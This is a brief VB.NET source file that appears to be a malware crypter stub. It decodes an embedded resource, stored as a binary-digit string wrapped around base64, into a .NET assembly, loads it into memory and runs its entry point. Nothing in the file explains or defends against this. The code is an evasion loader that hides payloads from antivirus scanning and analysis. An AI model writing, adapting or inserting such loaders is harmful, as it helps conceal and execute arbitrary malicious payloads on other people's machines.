Module Module1
    Sub Main()
        AppDomain.CurrentDomain.Load(Convert.FromBase64String(xDecode(My.Resources.b))).EntryPoint.Invoke(0, Nothing)
    End Sub
    Public Function xDecode(ByVal Binary As String) As String
        Dim Characters As String = System.Text.RegularExpressions.Regex.Replace(Binary, "[^01]", "")
        Dim ByteArray((Characters.Length / 8) - 1) As Byte
        For Index As Integer = 0 To ByteArray.Length - 1
            ByteArray(Index) = Convert.ToByte(Characters.Substring(Index * 8, 8), 2)
        Next
        Return System.Text.ASCIIEncoding.ASCII.GetString(ByteArray)
    End Function
End Module
